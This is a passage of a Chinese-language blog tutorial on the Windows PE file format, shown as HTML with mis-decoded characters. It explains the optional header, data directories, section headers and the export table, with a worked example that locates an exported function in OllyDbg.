é»˜è®¤æ˜¯4KB</span></span><br><span class="line">    <span class="number">00020000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    <span class="comment">//ä¿ç•™å †çš„å¤§å° é»˜è®¤æ˜¯1MB</span></span><br><span class="line">    <span class="number">01000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    <span class="comment">//æŒ‡å®šå †å¤§å° é»˜è®¤æ˜¯4K</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    <span class="comment">//çœ‹åˆ°çš„èµ„æ–™éƒ½æ˜¯ä¿ç•™ value ä¸º 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    <span class="comment">//æ•°æ®ç›®å½•çš„é¡¹æ•°, å³æŒ‡å‡ºäº†æˆ‘ä»¬ä¸‹é¢ä¸€ä¸ªæˆå‘˜æ•°ç»„çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="comment">//è™½ç„¶å®å®šä¹‰äº†#defineIMAGE_NUMBEROF_DIRECTORY_ENTRIES16</span></span><br><span class="line">    <span class="comment">//ä½†æ˜¯PEè£…è½½å™¨ä¼šé€šè¿‡æ­¤å€¼æ¥è¯†åˆ«æ•°ç»„å¤§å°,è¯´æ˜æ•°ç»„å¤§å°ä¹Ÿå¯èƒ½é16</span></span><br><span class="line">    <span class="number">00000010</span>   </span><br><span class="line">       </span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; </span><br><span class="line">    <span class="comment">//å¾ˆé‡è¦ï¼Œä¸€ä¸ªæ•°æ®ç›®å½•ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è®°å½•äº†å¯¹äºæ•°æ®é¡¹çš„RVAåŠSize</span></span><br><span class="line">    <span class="comment">//é‡ç‚¹:  EXPORT IMPORT, RESOURCE, TLS Direction</span></span><br><span class="line"> </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509154933553-1590826622691.png" alt="image-20200509154933553"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// è¾“å‡ºè¡¨(å¯¼å…¥è¡¨) (é‡è¦)</span></span></span><br><span class="line">RVA:<span class="number">0010F</span>000 Size:<span class="number">000012F</span>A </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// è¾“å…¥è¡¨ (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// èµ„æºç›®å½• (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// å¼‚å¸¸ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// å®‰å…¨ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// åŸºå€é‡å®šä½è¡¨ (é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// è°ƒè¯•ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   <span class="comment">// æè¿°ä¿¡æ¯(ç‰ˆæƒä¿¡æ¯ä¹‹ç±»)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    8   <span class="comment">// æ¶æ„ç‰¹å®šæ•°æ®</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       9   <span class="comment">// æœºå™¨å€¼</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            10   <span class="comment">// çº¿ç¨‹çº§å±€éƒ¨å­˜å‚¨ç›®å½•(é‡è¦)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    11   <span class="comment">// è½½å…¥é…ç½®ç›®å½•</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   12   <span class="comment">// ç»‘å®šè¾“å…¥ç›®å½• </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            13   <span class="comment">// è¾“å…¥åœ°å€è¡¨</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   14   <span class="comment">// å»¶è¿ŸåŠ è½½å¯¼å…¥æè¿°ç¬¦</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 15   <span class="comment">// COMè¿è¡Œæ—¶æè¿°ç¬¦</span></span></span><br></pre></td></tr></table></figure><blockquote><p>PEæ–‡ä»¶ä¸­çš„code(ä»£ç ), data(æ•°æ®), resource(èµ„æº)ç­‰æŒ‰ç…§å±æ€§åˆ†ç±»å‚¨å­˜åœ¨ä¸åŒçš„èŠ‚åŒº, (1)è¿™æ ·åˆ†ç±»ä¾¿äºç»Ÿä¸€å’ŒæŸ¥çœ‹  (2)è¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¿æŠ¤ç¨‹åºçš„å®‰å…¨æ€§, å› ä¸ºå¦‚æœæŠŠæ‰€æœ‰çš„ä»£ç æ•°æ®æ”¾åœ¨ä¸€èµ·çš„è¯, å½“æˆ‘ä»¬å‘æ•°æ®åŒºå†™æ•°æ®æ—¶, è‹¥è¾“å…¥è¶…è¿‡ç¼“å†²åŒºçš„å¤§å°, é‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šå°†å…¶ä¸‹çš„code(æŒ‡ä»¤)è¦†ç›–æ‰, é€ æˆåº”ç”¨ç¨‹åºå´©æºƒ. PEæ–‡ä»¶å°±å¯ä»¥æŠŠç›¸ä¼¼å±æ€§çš„çš„æ•°æ®ä¿å­˜åœ¨ä¸€ä¸ªè¢«ç§°ä¸ºâ€èŠ‚åŒºâ€çš„åœ°æ–¹, ç„¶åä¸ºæ¯ä¸ªèŠ‚åŒºè®¾ç½®ä¸åŒçš„ç‰¹æ€§,è®¿é—®æƒé™ç­‰.                                                                              </p></blockquote><h2 id="0x4-èŠ‚åŒºå¤´"><a href="#0x4-èŠ‚åŒºå¤´" class="headerlink" title="0x4 èŠ‚åŒºå¤´"></a>0x4 èŠ‚åŒºå¤´</h2><p><strong>èŠ‚åŒºå¤´æ˜¯ç”±IMAGE_SECTION_HEADERç»“æ„ä½“ç»„æˆçš„æ•°ç»„, æ¯ä¸ªç»“æ„ä½“å¯¹åº”ä¸€ä¸ªèŠ‚åŒº</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME      8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE NAME[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="comment">//èŠ‚åŒºçš„åå­— 8ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="comment">//å¦‚æœæ‰€æœ‰çš„8å­—èŠ‚éƒ½è¢«ç”¨å…‰ï¼Œè¯¥å­—ç¬¦ä¸²å°±æ²¡æœ‰0ç»“æŸç¬¦ï¼Œ</span></span><br><span class="line">    <span class="comment">//å…¸å‹çš„åç§°.data .text .bss å½¢å¼ (.ä¸æ˜¯å¿…é¡»)</span></span><br><span class="line">    <span class="comment">//èŠ‚åŒºåç§°éƒ½å’ŒèŠ‚ä¸­çš„å†…å®¹ä¸ä¸€å®šç›¸å…³,</span></span><br><span class="line">    <span class="comment">//èŠ‚åç§°æ²¡æœ‰ä¸¥æ ¼è¦æ±‚å‰è¾¹å¸¦æœ‰â€œ$â€çš„ç›¸åŒåå­—çš„åŒºå—åœ¨è½½å…¥æ—¶å€™å°†ä¼šè¢«åˆå¹¶ï¼Œ</span></span><br><span class="line">    <span class="comment">//åœ¨å¹¶ï¼Œåœ¨åˆå¹¶ä¹‹åçš„åŒºå—ä¸­ï¼Œä»–ä»¬æ˜¯ç…§â€œ$â€åè¾¹çš„å­—ç¬¦çš„å­—æ¯é¡ºåºè¿›è¡Œåˆå¹¶çš„ã€‚</span></span><br><span class="line">    <span class="comment">//æ¯ä¸ªåŒºå—çš„åç§°éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä¸èƒ½æœ‰åŒåçš„ä¸¤ä¸ªåŒºå—</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        DOWORD PhysicalAddress; </span><br><span class="line">        DOWORD VitualSize; </span><br><span class="line">    <span class="comment">//å†…å­˜ä¸­èŠ‚åŒºæ‰€å å¤§å°(å®é™…åˆå§‹äº†çš„æ•°æ®å¤§å°, æœªå†…å­˜å¯¹é½)</span></span><br><span class="line">   </span><br><span class="line">    &#125;Misc;</span><br><span class="line">    </span><br><span class="line">    DWORD VirtualAddress; </span><br><span class="line">    <span class="comment">//å†…å­˜ä¸­èŠ‚åŒºçš„èµ·å§‹åœ°å€(RVA). å¼€å§‹æ²¡æœ‰å€¼, ç”±SectionAlignmentç¡®å®š</span></span><br><span class="line">    </span><br><span class="line">    DWORD SizeofRawData; </span><br><span class="line">    <span class="comment">//ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºæ‰€å å¤§å°(å¯¹é½åçš„å¤§å°)</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRawData; </span><br><span class="line">    <span class="comment">//ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºçš„èµ·å§‹ä½ç½®. å¼€å§‹æ²¡æœ‰å€¼, ç”±FileAlignmentç¡®å®š</span></span><br><span class="line">    </span><br><span class="line">    DWORD PointerToRelocations; </span><br><span class="line">    <span class="comment">//é‡å®šä½æŒ‡é’ˆ  ä¸‹é¢å››ä¸ªéƒ½æ˜¯ç”¨äºç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯</span></span><br><span class="line">        </span><br><span class="line">    DWORD PointerToLinenumbers; </span><br><span class="line">    <span class="comment">//è¡Œæ•°æŒ‡é’ˆ</span></span><br><span class="line">        </span><br><span class="line">    WORD NumberOfRelocations; </span><br><span class="line">    <span class="comment">//é‡å®šä½æ•°</span></span><br><span class="line">    </span><br><span class="line">    WORD NumberOfLinenumbers; </span><br><span class="line">    <span class="comment">//è¡Œæ•°</span></span><br><span class="line">    </span><br><span class="line">    DWORD Characteristics; </span><br><span class="line">    <span class="comment">//æŒ‡å®šèŠ‚çš„å±æ€§,æƒé™. ç”±ä¸åŒçš„å€¼ bit or è€Œæˆ </span></span><br><span class="line">    <span class="comment">//0x20: åŒ…å«ä»£ç .           0x40: åŒ…å«åˆå§‹åŒ–æ•°æ®çš„èŠ‚</span></span><br><span class="line">    <span class="comment">//0x80: åŒ…å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚  0x20000000: å¯æ‰§è¡Œ (x)</span></span><br><span class="line">    <span class="comment">//0x40000000: å¯è¯» (r)     0x80000000: å¯å†™ (w)</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>  <strong>ä¸‹å›¾å±•ç¤ºODç¨‹åºçš„å„ä¸ªèŠ‚, å¹¶å°†(.txt)èŠ‚ä¸­çš„å„æˆå‘˜å€¼åœ¨ä¸Šé¢ä¾æ¬¡æ ‡å‡º</strong>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200509170302585-1590826622691.png" alt="image-20200509170302585"></p><blockquote><p>ç”±äºæ¯ä¸ªèŠ‚åŒºéƒ½æœ‰å†…å­˜åœ°å€åˆ°æ–‡ä»¶åç§»é—´çš„æ˜ å°„(RAW-RVA). æˆ‘ä»¬å¯ä»¥é€šè¿‡èŠ‚åŒºçš„VirtualAddressä¸PointerToRawDataæ¥ä»RVA-&gt;RAW. </p><p>æ³¨: ç”±äºVirtualAddressæ˜¯æœªå¯¹é½çš„å¤§å°,è€ŒSizeofRawDataæ˜¯å¯¹é½åçš„å¤§å°, é‚£ä¹ˆ VirtualAddressä¸€èˆ¬æ¯”SizeofRawDataå°.  ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–, å°±æ˜¯å½“å«æœ‰æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚(å¦‚.bss), åœ¨ç£ç›˜ä¸­æœªåˆå§‹åŒ–æ•°æ®æ˜¯ä¸å ç©ºé—´çš„, ä½†æ˜¯åˆ°äº†å†…å­˜, æœªåˆå§‹åŒ–çš„æ•°æ®æ˜¯è¦èµ‹å€¼å ç©ºé—´.</p></blockquote><hr><h2 id="0x5-IMAGE-EXPORT-DIRECTORY-è¾“å‡ºè¡¨"><a href="#0x5-IMAGE-EXPORT-DIRECTORY-è¾“å‡ºè¡¨" class="headerlink" title="0x5 IMAGE_EXPORT_DIRECTORY è¾“å‡ºè¡¨"></a>0x5 IMAGE_EXPORT_DIRECTORY è¾“å‡ºè¡¨</h2><p><strong>ä¸€èˆ¬dllæ–‡ä»¶æ‰æœ‰,DataDirectory[0]è®°å½•äº†RVAåŠSize.</strong></p><p><strong>ç”¨æ¥æè¿°æ¨¡å—ï¼ˆdllï¼‰ä¸­çš„å¯¼å‡ºå‡½æ•°çš„ç»“æ„ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—å¯¼å‡ºäº†å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä¼šè¢«è®°å½•åœ¨å¯¼å‡ºè¡¨ä¸­,ä»      åº“å‘å…¶ä»–PEæ–‡ä»¶æä¾›æœåŠ¡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    <span class="comment">//é€šå¸¸ä¸º0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    <span class="comment">//åˆ›å»ºæ—¶é—´, ä¸æ˜¯å¾ˆæœ‰æ•ˆçš„å€¼</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    <span class="comment">//ä¸»ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    <span class="comment">//å°ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Name;</span><br><span class="line">    <span class="comment">//æŒ‡å‘ä»¥0ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²(DLLåç§°)çš„RVA</span></span><br><span class="line">    <span class="comment">//å¦‚(user32.dll, kernel32.dll)</span></span><br><span class="line">    <span class="number">0010F</span>780</span><br><span class="line">    </span><br><span class="line">    DWORD   Base;</span><br><span class="line">    <span class="comment">//åŸºå€, ä¸€ä¸ªè¾“å‡ºé¡¹çš„åºæ•°å°±æ˜¯å‡½æ•°åœ°å€æ•°ç»„ä¸­çš„ç´¢å¼•å€¼åŠ base.</span></span><br><span class="line">    <span class="comment">//baseå¤§å¤šæ—¶å€™ä¸º1 , è¯´æ˜ç¬¬ä¸€ä¸ªè¾“å‡ºå‡½æ•°çš„åºæ•°ä¸º1</span></span><br><span class="line">    <span class="number">00000001</span></span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    <span class="comment">//å®é™…Exportå‡½æ•°çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°ä¸­å…·åçš„å‡½æ•°ä¸ªæ•°(ä»¥åç§°æ¥è¾“å‡ºå‡½æ•°çš„æ•°é‡)</span></span><br><span class="line">    <span class="number">000000B</span>C</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfFunctions;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°åœ°å€æ•°ç»„(æ•°ç»„ä¸ªæ•°: NumberOfFunctions)</span></span><br><span class="line">    <span class="number">0010F</span>028</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNames;</span><br><span class="line">    <span class="comment">//Exportå‡½æ•°åç§°åœ°å€æ•°ç»„(æ•°ç»„ä¸ªæ•°:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>318</span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfNameOrdinals;</span><br><span class="line">    <span class="comment">//æŒ‡å‘å‡½æ•°ååç§°å¯¹åº”åºæ•°è¾“å‡ºæ¡ç›®åˆ—è¡¨çš„RVA</span></span><br><span class="line">    <span class="comment">//æ•°ç»„æ¯ä¸ªåç§°æ‹¥æœ‰ä¸€ä¸ªç›¸åº”çš„åºæ•°(æ•°ç»„ä¸ªæ•°:NumberOfNames)</span></span><br><span class="line">    <span class="number">0010F</span>608</span><br><span class="line">    </span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p><strong>ä»å¯¼å‡ºè¡¨ä¸­è·å¾—å‡½æ•°åœ°å€çš„APIä¸º: GetProcAddress()å‡½æ•°. è¯¥APIç”¨æ¥å¼•ç”¨EATæ¥è·å–æŒ‡å®šçš„APIçš„åœ°å€.</strong></p><p><strong>æ³¨: (1) å¯¼å‡ºå‡½æ•°ä¹Ÿå¯èƒ½æ²¡æœ‰åç§°çš„, è¿™æ—¶åªèƒ½é€šè¿‡åºæ•°å¯¼å‡º (2) åºæ•°æ˜¯æŒ‡å®šæŸä¸ªè¾“å‡ºå‡½æ•°çš„ç‹¬ä¸€æ— äºŒçš„16ä½æ•°å­—(2ä¸ªå­—èŠ‚)</strong></p><p>ä¸¤ç§å¯¼å‡ºå‡½æ•°çš„æ–¹æ³•:</p><p><strong>ä¸€:æŒ‰å‡½æ•°åå­—</strong></p><p>â€‹      <strong>(1)é€šè¿‡AddressOfNamesæ‰¾åˆ°å‡½æ•°åç§°æ•°ç»„.  ä½¿ç”¨strcmp()å‡½æ•°, åœ¨(RVA)æŒ‡é’ˆæ•°ç»„ä»ç´¢å¼•å€¼0å¼€å§‹ä¾æ¬¡ä¸æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°åç§°å¯¹æ¯”,ä»è€Œæ‰¾åˆ°ç´¢å¼•å€¼ index_name</strong></p><p>â€‹      <strong>(2)é€šè¿‡AddressOfNameOrdinalsæ‰¾åˆ°å­˜æ”¾å‡½æ•°åºå·çš„æ•°ç»„, ä½¿ç”¨æ­¥éª¤(1)è·å¾—çš„index_nameä¸ºç´¢å¼•å€¼æ‰¾åˆ°å‡½æ•°åœ°å€çš„åºå·(index_address)</strong></p><p>â€‹      <strong>(3)é€šè¿‡AddressOfFunctionsæ‰¾åˆ°å‡½æ•°åœ°å€æ•°ç»„(EAT), åœ¨EATä¸­ä½¿ç”¨æ­¥éª¤(2)è·å¾—çš„index_addressä¸ºç´¢å¼•å€¼æ‰¾åˆ°æŒ‡å®šå‡½æ•°çš„RVA</strong></p><p><strong>äºŒ:æŒ‰å‡½æ•°åºå·</strong></p><p>â€‹      <strong>(1)ä½¿ç”¨æˆ‘ä»¬å‡½æ•°çš„åºå·å‡å» _IMAGE_EXPORT_DIRECTORY.Base çš„å€¼å¾—åˆ°å‡½æ•°åœ°å€ç´¢å¼•å€¼index_address</strong></p><p>â€‹      <strong>(2)é€šè¿‡AddressOfFunctionsæ‰¾åˆ°å‡½æ•°åœ°å€æ•°ç»„(EAT), åœ¨EATä¸­ä½¿ç”¨æ­¥éª¤(1)è·å¾—çš„index_addressä¸ºç´¢å¼•å€¼æ‰¾åˆ°æŒ‡å®šå‡½æ•°çš„RVA</strong></p></blockquote><p>  <strong>ä¸‹é¢ä¾æ—§ç”¨ODç¨‹åºæ¥çœ‹å¯¼å‡ºè¡¨, å¹¶å°†æ¯ä¸ªå€¼æ ‡åœ¨ä¸Šé¢æ¯ä¸ªæˆå‘˜ä¸‹é¢,  é€šè¿‡ä¸Šé¢IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]ä»‹ç»,  å·²ç»æ ‡å‡ºå¯¼å‡ºè¡¨çš„RVA: 0010F000  Size: 000012FA</strong>. å†é€šè¿‡CFF Explorer å·¥å…·æŸ¥çœ‹æ¯ä¸ªèŠ‚çš„åœ°å€å¯ä»¥è®¡ç®—å‡ºè¾“å‡ºè¡¨çš„ RAW :  <strong>00CE200</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510143001536-1590826622691.png" alt="image-20200510143001536"></p><p>  1.æŸ¥çœ‹è¾“å‡ºè¡¨åç§°(<strong>RVA : 0010F780 -&gt; RAW: 000CE980</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151725862-1590826622691.png" alt="image-20200510151725862"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510151945596-1590826622691.png" alt="image-20200510151945596"></p><p>  2.æŸ¥æ‰¾å‡½æ•°åç§°.</p><p>   (1)<strong>AddressOfNames</strong>. (<strong>RVA: 0010F318 -&gt; RAW: 000CE518</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510153257760-1590826622691.png" alt="image-20200510153257760"></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154247725-1590826622691.png" alt="image-20200510154247725"></p><p>  ç”±(<strong>RVA:0010F78C -&gt; RAW: 000CE98C</strong>):</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510154722496-1590826622691.png" alt="image-20200510154722496"></p><p>  ç°åœ¨å·²ç»æ‰¾åˆ°äº†å‡½æ•°çš„åç§°, ä¸‹é¢æ¨¡æ‹ŸæŸ¥çœ‹ä¸€ä¸ªæŒ‡å®šåç§°å‡½æ•°çš„RVA. å‡è®¾æˆ‘ä»¬æ‰¾çš„æ˜¯<strong>Addsorteddata.</strong>(å³ç¬¬ä¸€ä¸ªå‡½æ•°), (1)é€šè¿‡strcmp(). å¾—åˆ°å®ƒçš„ç´¢å¼•å€¼æ˜¯0, è®°ä¸º index_name.  (2)é€šè¿‡AddressOfNameOrdinalsä½¿ç”¨index_nameæ‰¾åˆ°å‡½æ•°çš„åºæ•°, é€šè¿‡ä¸‹å›¾å¾—åˆ°åºæ•°0, è®°ä¸ºindex_address.</p><p>  <strong>AddressOfNameOrdinals</strong>.  (<strong>RVA: 0010F608 -&gt; RAW: 000CE808</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510160635396-1590826622691.png" alt="image-20200510160635396"></p><p>  (3)é€šè¿‡AddressOfFunctionså‡½æ•°åœ°å€æ•°ç»„(EAT), ä½¿ç”¨index_addressä¸ºç´¢å¼•å€¼å¾—åˆ°æˆ‘ä»¬æŒ‡å®šå‡½æ•°çš„RVA.</p><p>   AddressOfFunctions(<strong>RVA: 0010F028 -&gt; RAW: 000CE228</strong>):<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161225077-1590826622691.png" alt="image-20200510161225077"></p><p>  åˆ°æ­¤, å¾—åˆ°æˆ‘ä»¬æŒ‡å®šè¾“å‡ºå‡½æ•°<strong>Addsorteddata.</strong>çš„RVA: <strong>00054EFC</strong>. æœ€åé€šè¿‡ ODè½½å…¥ODçœ‹ä¸€ä¸‹.<img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200510161939914-1590826622691.png" alt="image-20200510161939914"></p><p>  <strong>ä»è¿™é‡Œä¹Ÿè¯´æ˜äº†, .exeæ–‡ä»¶ä¹Ÿæ˜¯å¯èƒ½æœ‰è¾“å‡ºè¡¨çš„</strong></p><hr><h2 id="0x6-IMAGE-IMPORT-DESCRIPTOP-è¾“å…¥è¡¨"><a href="#0x6-IMAGE-IMPORT-DESCRIPTOP-è¾“å…¥è¡¨" class="headerlink" title="0x6 IMAGE_IMPORT_DESCRIPTOP è¾“å…¥è¡¨"></a>0x6 IMAGE_IMPORT_DESCRIPTOP è¾“å…¥è¡¨</h2><p><strong>è®°å½•PEæ–‡ä»¶è¦å¯¼å…¥é‚£äº›åº“æ–‡ä»¶  DataDirectory[0]è®°å½•äº†RVAåŠSize.</strong></p><p><strong>é¦–å…ˆ, æ‰§è¡Œä¸€ä¸ªç¨‹åºä¼šæœ‰å¾ˆå¤šçš„å‡½æ•°æ˜¯å…¬ç”¨çš„,åœ¨åŠ¨æ€é“¾æ¥åº“é‡Œ(åŠ¨æ€é“¾æ¥åº“, .dllæ–‡ä»¶æ€»æ˜¯é™„åŠ åœ¨ä¸€ä¸ªè¦æ‰§è¡Œçš„ç¨‹åºä¸­, .dllæ–‡ä»¶ä¸­æœ‰è¯´æ˜åº“EATçš„è¾“å‡ºè¡¨), å¦‚ä¸‹å›¾, ä¸€ä¸ªç¨‹åºåŠ è½½çš„éƒ¨åˆ† .dllæ–‡ä»¶.</strong><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200518132004979-1590826622691.png" alt="image-20200518132004979"></p><p><strong>æˆ‘ä»¬çš„è¾“å…¥è¡¨è®°å½•äº†éœ€è¦ç”¨åˆ°çš„å‡½æ•°åç§°, é€šè¿‡åœ¨åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ä¸­æœç´¢è¯¥å‡½æ•°å¾—åˆ°å®é™…çš„RVA, 